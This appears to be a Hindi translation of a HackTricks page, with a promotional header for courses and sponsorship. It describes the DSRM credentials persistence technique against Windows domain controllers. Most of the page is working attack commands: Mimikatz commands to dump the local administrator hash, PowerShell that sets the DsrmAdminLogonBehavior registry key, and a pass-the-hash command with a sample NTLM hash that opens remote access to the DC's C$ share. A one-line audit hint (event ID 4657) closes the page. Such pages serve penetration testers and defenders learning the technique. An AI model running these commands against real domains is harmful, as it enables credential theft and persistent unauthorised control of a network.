<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी का विज्ञापन **HackTricks** में देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) पर **फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें** और PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>


# DSRM Credentials

हर **DC** में एक **स्थानीय व्यवस्थापक** खाता होता है। इस मशीन में व्यवस्थापक विशेषाधिकार होने पर आप मिमीकेट्ज का उपयोग करके **स्थानीय व्यवस्थापक हैश डंप** कर सकते हैं। फिर, इस पासवर्ड को **सक्रिय** करने के लिए एक रजिस्ट्री को **संशोधित** करके आप इस स्थानीय व्यवस्थापक उपयोगकर्ता तक रिमोट रूप से पहुंच सकते हैं।\
सबसे पहले हमें DC में स्थानीय व्यवस्थापक उपयोगकर्ता का **हैश डंप** करना होगा:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
फिर हमें यह जांचना होगा कि क्या वह खाता काम करेगा, और यदि रजिस्ट्री कुंजी में मान "0" है या यह मौजूद नहीं है तो आपको **इसे "2" पर सेट करना होगा**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
तब, एक PTH का उपयोग करके आप C$ की सामग्री की सूची बना सकते हैं या शेल प्राप्त कर सकते हैं। ध्यान दें कि उस हैश के साथ मेमोरी में नई पावरशेल सत्र बनाने के लिए (PTH के लिए) "डोमेन" का उपयोग केवल डीसी मशीन के नाम किया जाता है:
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
## शांति

* घटना आईडी 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior` के निर्माण/परिवर्तन की ऑडिट

इसके बारे में अधिक जानकारी: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) और [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)
